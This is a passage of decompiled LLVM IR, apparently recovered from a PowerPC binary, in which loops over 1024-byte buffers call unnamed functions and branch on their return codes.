  %v1_10001230 = add i32 %v1_10001228, 1472
  %v0_10001234 = load i32, i32* %r29.global-to-local, align 4
  %v0_10001238 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001238 = add i32 %v1_10001230, %v0_10001238
  store i32 %v2_10001238, i32* %r4.global-to-local, align 4
  store i32 268440128, i32* %lr.global-to-local, align 4
  %v3_1000123c = inttoptr i32 %v0_1000122c to i8*
  %v4_1000123c = call i32 @function_1000b040(i8* %v3_1000123c, i32 %v2_10001238, i32 %v0_10001234)
  store i32 %v4_1000123c, i32* %r3.global-to-local, align 4
  %v1_10001240 = icmp slt i32 %v4_1000123c, 0
  %v2_10001240 = icmp sgt i32 %v4_1000123c, 0
  %v3_10001240 = icmp eq i32 %v4_1000123c, 0
  store i1 %v1_10001240, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001240, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001240, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001240, label %dec_label_pc_1000120c, label %dec_label_pc_100010f0

dec_label_pc_1000124c:                            ; preds = %dec_label_pc_10000ff4
  %v1_1000124c = add i32 %v4_1000100c, 1
  store i32 %v1_1000124c, i32* %r3.global-to-local, align 4
  %v2_10001250 = add i32 %v0_10001010, %v1_1000124c
  store i32 %v2_10001250, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10001024

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000120c, %dec_label_pc_100011f0
  %v0_10001258 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001258, i32* %r3.global-to-local, align 4
  store i32 268440160, i32* @lr, align 4
  %v1_1000125c = inttoptr i32 %v0_10001258 to i8*
  %v2_1000125c = call i32 @function_1000ab64(i8* %v1_1000125c)
  store i32 %v2_1000125c, i32* %r3.global-to-local, align 4
  %v1_10001260 = icmp slt i32 %v2_1000125c, 127
  %v2_10001260 = icmp sgt i32 %v2_1000125c, 127
  %v3_10001260 = icmp eq i32 %v2_1000125c, 127
  store i1 %v1_10001260, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001260, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001260, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001260, label %dec_label_pc_100010f0, label %dec_label_pc_10001268

dec_label_pc_10001268:                            ; preds = %dec_label_pc_10001258
  %v0_10001268 = load i32, i32* @r30, align 4
  %v1_10001268 = add i32 %v0_10001268, 935
  %v2_10001268 = inttoptr i32 %v1_10001268 to i32*
  %v3_10001268 = load i32, i32* %v2_10001268, align 4
  %v0_1000126c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000126c, i32* %r4.global-to-local, align 4
  %v0_10001270 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10001270, i32* %r29.global-to-local, align 4
  %v1_10001274 = mul i32 %v3_10001268, 128
  %v1_10001278 = add i32 %v1_10001274, 1472
  %v0_1000127c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000127c = add i32 %v1_10001278, %v0_1000127c
  store i32 %v2_1000127c, i32* @r3, align 4
  store i32 268440196, i32* %lr.global-to-local, align 4
  %v2_10001280 = inttoptr i32 %v2_1000127c to i8*
  %v3_10001280 = call i32 @function_1000ab8c(i8* %v2_10001280, i32 %v0_1000126c)
  store i32 %v3_10001280, i32* %r3.global-to-local, align 4
  %v0_10001284 = load i32, i32* @r30, align 4
  %v1_10001284 = add i32 %v0_10001284, 935
  %v2_10001284 = inttoptr i32 %v1_10001284 to i32*
  %v3_10001284 = load i32, i32* %v2_10001284, align 4
  %v1_10001288 = add i32 %v3_10001284, 1
  store i32 %v1_10001288, i32* %r9.global-to-local, align 4
  store i32 %v1_10001288, i32* %v2_10001284, align 4
  br label %dec_label_pc_100010f4

dec_label_pc_10001294:                            ; preds = %dec_label_pc_10000814
  store i32 268440216, i32* %lr.global-to-local, align 4
  %v0_10001294 = call i32 @function_1000bb0c()
  store i32 %v0_10001294, i32* %r3.global-to-local, align 4
  %v0_10001298 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001298 = add i32 %v0_10001298, 1472
  store i32 %v1_10001298, i32* %r0.global-to-local, align 4
  %v1_1000129c = load i32, i32* @r1, align 4
  %v2_1000129c = add i32 %v1_1000129c, 20808
  %v3_1000129c = inttoptr i32 %v2_1000129c to i32*
  store i32 %v1_10001298, i32* %v3_1000129c, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v0_100012a4 = load i32, i32* @r30, align 4
  %v1_100012a4 = add i32 %v0_100012a4, 1579
  %v2_100012a4 = inttoptr i32 %v1_100012a4 to i32*
  %v3_100012a4 = load i32, i32* %v2_100012a4, align 4
  store i32 %v3_100012a4, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v0_10001294, i32* %r25.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32* %r15.global-to-local, align 4
  %v1_100012b4 = icmp slt i32 %v3_100012a4, 1024
  %v2_100012b4 = icmp sgt i32 %v3_100012a4, 1024
  %v3_100012b4 = icmp eq i32 %v3_100012a4, 1024
  store i1 %v1_100012b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100012b4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100012b4, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1000de60.39 to i32), i32* %r14.global-to-local, align 4
  %v0_100012bc = load i32, i32* %r23.global-to-local, align 4
  %v1_100012bc = add i32 %v0_100012bc, 2116
  store i32 %v1_100012bc, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br i1 %v3_100012b4, label %dec_label_pc_100013c8, label %dec_label_pc_100012c8

dec_label_pc_100012c8:                            ; preds = %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge, %dec_label_pc_10001294
  %v1_100012d0 = phi i32 [ %v1_100012d0.pre, %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge ], [ %v0_10001294, %dec_label_pc_10001294 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  store i32 0, i32* %v2_100012d0, align 4
  %v0_100012d4 = load i32, i32* @r30, align 4
  %v1_100012d4 = add i32 %v0_100012d4, 1579
  %v2_100012d4 = inttoptr i32 %v1_100012d4 to i32*
  %v3_100012d4 = load i32, i32* %v2_100012d4, align 4
  store i32 %v3_100012d4, i32* %r4.global-to-local, align 4
  %v1_100012d8 = add i32 %v0_100012d4, -533
  %v2_100012d8 = inttoptr i32 %v1_100012d8 to i32*
  %v3_100012d8 = load i32, i32* %v2_100012d8, align 4
  store i32 %v3_100012d8, i32* %r3.global-to-local, align 4
  %v1_100012dc = sub i32 1024, %v3_100012d4
  %v0_100012e0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100012e0 = add i32 %v0_100012e0, %v3_100012d4
  store i32 %v2_100012e0, i32* %r4.global-to-local, align 4
  store i32 268440296, i32* @lr, align 4
  %v4_100012e4 = call i32 @function_1000c090(i32 %v3_100012d8, i32 %v2_100012e0, i32 %v1_100012dc, i32 16384)
  store i32 %v4_100012e4, i32* %r3.global-to-local, align 4
  %v3_100012e8 = icmp eq i32 %v4_100012e4, 0
  br i1 %v3_100012e8, label %dec_label_pc_1000140c, label %dec_label_pc_100012f0

dec_label_pc_100012f0:                            ; preds = %dec_label_pc_100013c8, %dec_label_pc_100012c8
  %v1_10001308 = phi i32 [ %v4_10001400, %dec_label_pc_100013c8 ], [ %v4_100012e4, %dec_label_pc_100012c8 ]
  %v1_100012f0 = icmp slt i32 %v1_10001308, -1
  %v2_100012f0 = icmp sgt i32 %v1_10001308, -1
  %v3_100012f0 = icmp eq i32 %v1_10001308, -1
  store i1 %v1_100012f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100012f0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100012f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100012f0, label %dec_label_pc_100017ec, label %dec_label_pc_100012f8

dec_label_pc_100012f8:                            ; preds = %dec_label_pc_100012f0
  %v0_100012f8 = load i32, i32* @r30, align 4
  %v1_100012f8 = add i32 %v0_100012f8, 1579
  %v2_100012f8 = inttoptr i32 %v1_100012f8 to i32*
  %v3_100012f8 = load i32, i32* %v2_100012f8, align 4
  store i32 %v3_100012f8, i32* %r29.global-to-local, align 4
  %v0_100012fc = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100012fc, i32* %r24.global-to-local, align 4
  %v0_10001300 = load i32, i32* @r1, align 4
  %v1_10001300 = add i32 %v0_10001300, 20792
  %v2_10001300 = inttoptr i32 %v1_10001300 to i32*
  %v3_10001300 = load i32, i32* %v2_10001300, align 4
  store i32 %v3_10001300, i32* %r0.global-to-local, align 4
  %v0_10001304 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10001304, i32* %r17.global-to-local, align 4
  %v2_10001308 = add i32 %v3_100012f8, %v1_10001308
  store i32 %v2_10001308, i32* %r29.global-to-local, align 4
  %v2_1000130c = add i32 %v0_100012f8, -525
  %v3_1000130c = inttoptr i32 %v2_1000130c to i32*
  store i32 %v3_10001300, i32* %v3_1000130c, align 4
  %v0_10001310 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001310 = load i32, i32* @r30, align 4
  %v2_10001310 = add i32 %v1_10001310, 1579
  %v3_10001310 = inttoptr i32 %v2_10001310 to i32*
  store i32 %v0_10001310, i32* %v3_10001310, align 4
  br label %dec_label_pc_1000139c

dec_label_pc_10001318:                            ; preds = %dec_label_pc_1000139c
  %v1_10001318 = load i32, i32* %r29.global-to-local, align 4
  %v3_10001318 = icmp sgt i32 %v3_1000139c, %v1_10001318
  %v1_10001318.v3_1000139c = select i1 %v3_10001318, i32 %v1_10001318, i32 %v3_1000139c
  store i32 %v1_10001318.v3_1000139c, i32* %r28.global-to-local, align 4
  %v1_10001328 = add i32 %v0_1000139c, 919
  %v2_10001328 = inttoptr i32 %v1_10001328 to i32*
  %v3_10001328 = load i32, i32* %v2_10001328, align 4
  store i32 %v3_10001328, i32* %r0.global-to-local, align 4
  %v2_1000132c = sub i32 %v3_1000139c, %v1_10001318.v3_1000139c
  store i32 %v2_1000132c, i32* @r31, align 4
  store i32 %v2_1000132c, i32* %v2_1000139c, align 4
  %v0_10001334 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001334 = icmp slt i32 %v0_10001334, 1
  %v2_10001334 = icmp sgt i32 %v0_10001334, 1
  %v3_10001334 = icmp eq i32 %v0_10001334, 1
  store i1 %v1_10001334, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001334, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001334, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001334, label %dec_label_pc_1000142c, label %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge

dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge: ; preds = %dec_label_pc_10001318
  %v0_1000133c.pr.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_1000133c:                            ; preds = %dec_label_pc_100013a8, %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge, %dec_label_pc_10001454
  %v0_1000133c = phi i32 [ %v3_10001454, %dec_label_pc_10001454 ], [ %v0_1000133c.pr.pre, %dec_label_pc_10001328.dec_label_pc_1000133cthread-pre-split_crit_edge ], [ %v3_1000139c, %dec_label_pc_100013a8 ]
  %v1_1000133c = icmp slt i32 %v0_1000133c, 0
  %v2_1000133c = icmp sgt i32 %v0_1000133c, 0
  %v3_1000133c = icmp eq i32 %v0_1000133c, 0
  store i1 %v1_1000133c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000133c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000133c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000133c, label %dec_label_pc_10001344, label %dec_label_pc_10001364

dec_label_pc_10001344:                            ; preds = %dec_label_pc_1000133c
  %v0_10001344 = load i32, i32* @r30, align 4
  %v1_10001344 = add i32 %v0_10001344, 927
  %v2_10001344 = inttoptr i32 %v1_10001344 to i32*
  %v3_10001344 = load i32, i32* %v2_10001344, align 4
  store i32 %v3_10001344, i32* %r29.global-to-local, align 4
  %v1_10001348 = icmp slt i32 %v3_10001344, 1
  %v2_10001348 = icmp sgt i32 %v3_10001344, 1
  %v3_10001348 = icmp eq i32 %v3_10001344, 1
  store i1 %v1_10001348, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001348, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001348, i1* %cr7_eq.global-to-local, align 1
  %v1_1000145c = add i32 %v0_10001344, 1579
  %v2_1000145c = inttoptr i32 %v1_1000145c to i32*
  %v3_1000145c = load i32, i32* %v2_1000145c, align 4
  br i1 %v3_10001348, label %dec_label_pc_1000145c, label %dec_label_pc_10001350

dec_label_pc_10001350:                            ; preds = %dec_label_pc_10001344
  %v0_10001354 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001354 = sub i32 %v3_1000145c, %v0_10001354
  store i32 %v2_10001354, i32* %r0.global-to-local, align 4
  %v1_10001358 = icmp slt i32 %v2_10001354, 0
  %v2_10001358 = icmp sgt i32 %v2_10001354, 0
  %v3_10001358 = icmp eq i32 %v2_10001354, 0
  store i1 %v1_10001358, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001358, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001358, i1* %cr7_eq.global-to-local, align 1
  %v2_1000135c = add i32 %v0_10001344, 931
  %v3_1000135c = inttoptr i32 %v2_1000135c to i32*
  store i32 %v2_10001354, i32* %v3_1000135c, align 4
  br i1 %v3_10001358, label %dec_label_pc_100011e4, label %dec_label_pc_10001364

dec_label_pc_10001364:                            ; preds = %dec_label_pc_1000133c, %dec_label_pc_1000145c, %dec_label_pc_10001350, %dec_label_pc_100014e4
  %v0_10001364 = load i32, i32* %r28.global-to-local, align 4
  %v1_10001364 = icmp slt i32 %v0_10001364, 0
  %v2_10001364 = icmp sgt i32 %v0_10001364, 0
  %v3_10001364 = icmp eq i32 %v0_10001364, 0
  store i1 %v1_10001364, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001364, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001364, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001364, label %dec_label_pc_100013b0, label %dec_label_pc_1000136c

dec_label_pc_1000136c:                            ; preds = %dec_label_pc_10001364
  %v0_1000136c = load i32, i32* @r30, align 4
  %v1_1000136c = add i32 %v0_1000136c, 1579
  %v2_1000136c = inttoptr i32 %v1_1000136c to i32*
  %v3_1000136c = load i32, i32* %v2_1000136c, align 4
  store i32 %v3_1000136c, i32* %r0.global-to-local, align 4
  %v0_10001370 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001370 = add i32 %v0_10001370, %v0_10001364
  store i32 %v2_10001370, i32* %r4.global-to-local, align 4
  store i32 %v0_10001370, i32* %r3.global-to-local, align 4
  %v2_10001378 = sub i32 %v3_1000136c, %v0_10001364
  store i32 %v2_10001378, i32* %r29.global-to-local, align 4
  store i32 %v2_10001378, i32* %v2_1000136c, align 4
  %v0_10001380 = load i32, i32* %r29.global-to-local, align 4
  store i32 268440456, i32* @lr, align 4
  %v3_10001384 = call i32 @function_1000bbec(i32 %v0_10001370, i32 %v2_10001370, i32 %v0_10001380)
  store i32 %v3_10001384, i32* %r3.global-to-local, align 4
  %v0_10001388 = load i32, i32* @r30, align 4
  %v1_10001388 = add i32 %v0_10001388, 1579
  %v2_10001388 = inttoptr i32 %v1_10001388 to i32*
  %v3_10001388 = load i32, i32* %v2_10001388, align 4
  store i32 %v3_10001388, i32* %r29.global-to-local, align 4
  %v1_1000138c = icmp slt i32 %v3_10001388, 0
  %v2_1000138c = icmp sgt i32 %v3_10001388, 0
  %v3_1000138c = icmp eq i32 %v3_10001388, 0
  store i1 %v1_1000138c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000138c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000138c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001390 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001390 = add i32 %v1_10001390, %v3_10001388
  store i32 %v2_10001390, i32* %r9.global-to-local, align 4
  %v0_10001394 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001394 = trunc i32 %v0_10001394 to i8
  %v3_10001394 = add i32 %v2_10001390, 2116
  %v4_10001394 = inttoptr i32 %v3_10001394 to i8*
  store i8 %v1_10001394, i8* %v4_10001394, align 1
  %v0_10001398 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10001398, label %dec_label_pc_100013b0, label %dec_label_pc_1000139c

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_1000136c, %dec_label_pc_100012f8
  %v0_1000139c = load i32, i32* @r30, align 4
  %v1_1000139c = add i32 %v0_1000139c, 931
  %v2_1000139c = inttoptr i32 %v1_1000139c to i32*
  %v3_1000139c = load i32, i32* %v2_1000139c, align 4
  store i32 %v3_1000139c, i32* @r31, align 4
  %v1_100013a0 = icmp slt i32 %v3_1000139c, 0
  %v2_100013a0 = icmp sgt i32 %v3_1000139c, 0
  %v3_100013a0 = icmp eq i32 %v3_1000139c, 0
  store i1 %v1_100013a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013a0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100013a0, label %dec_label_pc_10001318, label %dec_label_pc_100013a8

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000139c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_100013b0:                            ; preds = %dec_label_pc_1000136c, %dec_label_pc_10001364
  %v0_100013b0 = load i32, i32* @r30, align 4
  %v1_100013b0 = add i32 %v0_100013b0, -529
  %v2_100013b0 = inttoptr i32 %v1_100013b0 to i8*
  %v3_100013b0 = load i8, i8* %v2_100013b0, align 1
  %v4_100013b0 = zext i8 %v3_100013b0 to i32
  store i32 %v4_100013b0, i32* %r0.global-to-local, align 4
  %v1_100013b4 = icmp ult i8 %v3_100013b0, 7
  %v2_100013b4 = icmp ugt i8 %v3_100013b0, 7
  %v3_100013b4 = icmp eq i8 %v3_100013b0, 7
  store i1 %v1_100013b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013b4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100013b4, label %dec_label_pc_100013bc, label %dec_label_pc_10000824

dec_label_pc_100013bc:                            ; preds = %dec_label_pc_100013b0
  %v1_100013bc = add i32 %v0_100013b0, 1579
  %v2_100013bc = inttoptr i32 %v1_100013bc to i32*
  %v3_100013bc = load i32, i32* %v2_100013bc, align 4
  store i32 %v3_100013bc, i32* %r0.global-to-local, align 4
  %v1_100013c0 = icmp slt i32 %v3_100013bc, 1024
  %v2_100013c0 = icmp sgt i32 %v3_100013bc, 1024
  %v3_100013c0 = icmp eq i32 %v3_100013bc, 1024
  store i1 %v1_100013c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100013c0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100013c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100013c0, label %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge, label %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge

dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge: ; preds = %dec_label_pc_100013bc
  %v1_100012d0.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_100012c8

dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge: ; preds = %dec_label_pc_100013bc
  %v0_100013c8.pre = load i32, i32* %r23.global-to-local, align 4
  %v0_100013d0.pre = load i32, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100013c8

dec_label_pc_100013c8:                            ; preds = %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge, %dec_label_pc_10001294
  %v0_100013d0 = phi i32 [ %v0_100013d0.pre, %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge ], [ %v1_100012bc, %dec_label_pc_10001294 ]
  %v0_100013c8 = phi i32 [ %v0_100013c8.pre, %dec_label_pc_100013bc.dec_label_pc_100013c8_crit_edge ], [ %v0_100012bc, %dec_label_pc_10001294 ]
  %v1_100013c8 = add i32 %v0_100013c8, 2180
  store i32 %v1_100013c8, i32* %r4.global-to-local, align 4
  store i32 %v0_100013d0, i32* %r3.global-to-local, align 4
  store i32 268440536, i32* @lr, align 4
  %v3_100013d4 = call i32 @function_1000bbec(i32 %v0_100013d0, i32 %v1_100013c8, i32 960)
  store i32 %v3_100013d4, i32* %r3.global-to-local, align 4
  %v0_100013d8 = load i32, i32* @r30, align 4
  %v1_100013d8 = add i32 %v0_100013d8, 1579
  %v2_100013d8 = inttoptr i32 %v1_100013d8 to i32*
  %v3_100013d8 = load i32, i32* %v2_100013d8, align 4
  store i32 %v3_100013d8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100013e4 = add i32 %v3_100013d8, -64
  store i32 %v1_100013e4, i32* %r29.global-to-local, align 4
  store i32 %v1_100013e4, i32* %v2_100013d8, align 4
  %v0_100013ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100013ec = load i32, i32* %r25.global-to-local, align 4
  %v2_100013ec = inttoptr i32 %v1_100013ec to i32*
  store i32 %v0_100013ec, i32* %v2_100013ec, align 4
  %v0_100013f0 = load i32, i32* @r30, align 4
  %v1_100013f0 = add i32 %v0_100013f0, 1579
  %v2_100013f0 = inttoptr i32 %v1_100013f0 to i32*
  %v3_100013f0 = load i32, i32* %v2_100013f0, align 4
  store i32 %v3_100013f0, i32* %r4.global-to-local, align 4
  %v1_100013f4 = add i32 %v0_100013f0, -533
  %v2_100013f4 = inttoptr i32 %v1_100013f4 to i32*
  %v3_100013f4 = load i32, i32* %v2_100013f4, align 4
  store i32 %v3_100013f4, i32* %r3.global-to-local, align 4
  %v1_100013f8 = sub i32 1024, %v3_100013f0
  %v0_100013fc = load i32, i32* %r27.global-to-local, align 4
  %v2_100013fc = add i32 %v0_100013fc, %v3_100013f0
  store i32 %v2_100013fc, i32* %r4.global-to-local, align 4
  store i32 268440580, i32* @lr, align 4
  %v4_10001400 = call i32 @function_1000c090(i32 %v3_100013f4, i32 %v2_100013fc, i32 %v1_100013f8, i32 16384)
  store i32 %v4_10001400, i32* %r3.global-to-local, align 4
  %v3_10001404 = icmp eq i32 %v4_10001400, 0
  br i1 %v3_10001404, label %dec_label_pc_1000140c, label %dec_label_pc_100012f0

dec_label_pc_1000140c:                            ; preds = %dec_label_pc_100013c8, %dec_label_pc_100012c8
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_10001410 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001410 = inttoptr i32 %v1_10001410 to i32*
  store i32 104, i32* %v2_10001410, align 4
  br label %dec_label_pc_10001414

dec_label_pc_10001414:                            ; preds = %dec_label_pc_100017ec, %dec_label_pc_1000140c
  %v0_10001414 = load i32, i32* @r30, align 4
  %v1_10001414 = add i32 %v0_10001414, -533
  %v2_10001414 = inttoptr i32 %v1_10001414 to i32*
  %v3_10001414 = load i32, i32* %v2_10001414, align 4
  store i32 %v3_10001414, i32* %r3.global-to-local, align 4
  store i32 268440604, i32* @lr, align 4
  %v0_10001418 = call i32 @function_1000b3f0()
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10001420 = load i32, i32* @r30, align 4
  %v2_10001420 = add i32 %v1_10001420, -533
  %v3_10001420 = inttoptr i32 %v2_10001420 to i32*
  store i32 -1, i32* %v3_10001420, align 4
  %v0_10001424 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001424 = trunc i32 %v0_10001424 to i8
  %v2_10001424 = load i32, i32* @r30, align 4
  %v3_10001424 = add i32 %v2_10001424, -529
  %v4_10001424 = inttoptr i32 %v3_10001424 to i8*
  store i8 %v1_10001424, i8* %v4_10001424, align 1
  br label %dec_label_pc_10000824

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001318
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 268440632, i32* %lr.global-to-local, align 4
  %v3_10001434 = call i32 @function_1000a238(i32 36, i32* null)
  %v0_10001438 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001438, i32* %r4.global-to-local, align 4
  %v0_10001444 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001444, i32* %r3.global-to-local, align 4
  store i32 268440652, i32* %lr.global-to-local, align 4
  %v4_10001448 = call i32 @function_1000ac30(i32 %v0_10001444, i32 %v0_10001438, i32 %v3_10001434, i32 11)
  store i32 %v4_10001448, i32* %r3.global-to-local, align 4
  %v1_1000144c = icmp slt i32 %v4_10001448, -1
  %v2_1000144c = icmp sgt i32 %v4_10001448, -1
  %v3_1000144c = icmp eq i32 %v4_10001448, -1
  store i1 %v1_1000144c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000144c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000144c, i1* %cr7_eq.global-to-local, align 1
  %v0_10001454 = load i32, i32* @r30, align 4
  br i1 %v3_1000144c, label %dec_label_pc_10001454, label %dec_label_pc_10001948

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c
  %v1_10001454 = add i32 %v0_10001454, 931
  %v2_10001454 = inttoptr i32 %v1_10001454 to i32*
  %v3_10001454 = load i32, i32* %v2_10001454, align 4
  store i32 %v3_10001454, i32* @r31, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_10001344
  store i32 %v3_1000145c, i32* %r4.global-to-local, align 4
  %v0_10001460 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001460, i32* %r3.global-to-local, align 4
  %v0_10001464 = load i32, i32* %r24.global-to-local, align 4
  store i32 268440688, i32* %lr.global-to-local, align 4
  %v5_1000146c = call i32 @function_1000ac30(i32 %v0_10001460, i32 %v3_1000145c, i32 %v0_10001464, i32 2)
  store i32 %v5_1000146c, i32* %r3.global-to-local, align 4
  %v1_10001470 = icmp slt i32 %v5_1000146c, -1
  %v2_10001470 = icmp sgt i32 %v5_1000146c, -1
  %v3_10001470 = icmp eq i32 %v5_1000146c, -1
  store i1 %v1_10001470, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001470, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001470, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001470, label %dec_label_pc_10001364, label %dec_label_pc_10001478

dec_label_pc_10001478:                            ; preds = %dec_label_pc_1000145c
  %v0_10001478 = load i32, i32* @r30, align 4
  %v1_10001478 = add i32 %v0_10001478, 1579
  %v2_10001478 = inttoptr i32 %v1_10001478 to i32*
  %v3_10001478 = load i32, i32* %v2_10001478, align 4
  store i32 %v3_10001478, i32* %r4.global-to-local, align 4
  %v0_1000147c = load i32, i32* %r24.global-to-local, align 4
  %v0_10001484 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001484, i32* %r3.global-to-local, align 4
  store i32 268440716, i32* %lr.global-to-local, align 4
  %v5_10001488 = call i32 @function_1000ac30(i32 %v0_10001484, i32 %v3_10001478, i32 %v0_1000147c, i32 2)
  %v0_1000148c = load i32, i32* %r17.global-to-local, align 4
  %v1_10001490 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001490 = add i32 %v1_10001490, %v5_10001488
  store i32 %v2_10001490, i32* %r9.global-to-local, align 4
  store i32 %v5_10001488, i32* %r28.global-to-local, align 4
  %v0_10001498 = load i32, i32* @r31, align 4
  %v1_10001498 = trunc i32 %v0_10001498 to i8
  %v3_10001498 = add i32 %v2_10001490, 2114
  %v4_10001498 = inttoptr i32 %v3_10001498 to i8*
  store i8 %v1_10001498, i8* %v4_10001498, align 1
  %v0_1000149c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000149c, i32* %r3.global-to-local, align 4
  %v0_100014a0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100014a0, i32* %r4.global-to-local, align 4
  store i32 268440748, i32* %lr.global-to-local, align 4
  %v4_100014a8 = call i32 @function_1000ac30(i32 %v0_1000149c, i32 %v0_100014a0, i32 %v0_1000148c, i32 1)
  store i32 %v4_100014a8, i32* %r3.global-to-local, align 4
  %v1_100014ac = icmp slt i32 %v4_100014a8, -1
  %v2_100014ac = icmp sgt i32 %v4_100014a8, -1
  %v3_100014ac = icmp eq i32 %v4_100014a8, -1
  store i1 %v1_100014ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100014ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100014ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100014ac, label %dec_label_pc_100014d0, label %dec_label_pc_100014b4

dec_label_pc_100014b4:                            ; preds = %dec_label_pc_10001478
  %v0_100014b4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100014b4, i32* %r3.global-to-local, align 4
  %v0_100014b8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100014b8, i32* %r4.global-to-local, align 4
  %v0_100014bc = load i32, i32* %r17.global-to-local, align 4
  store i32 268440776, i32* %lr.global-to-local, align 4
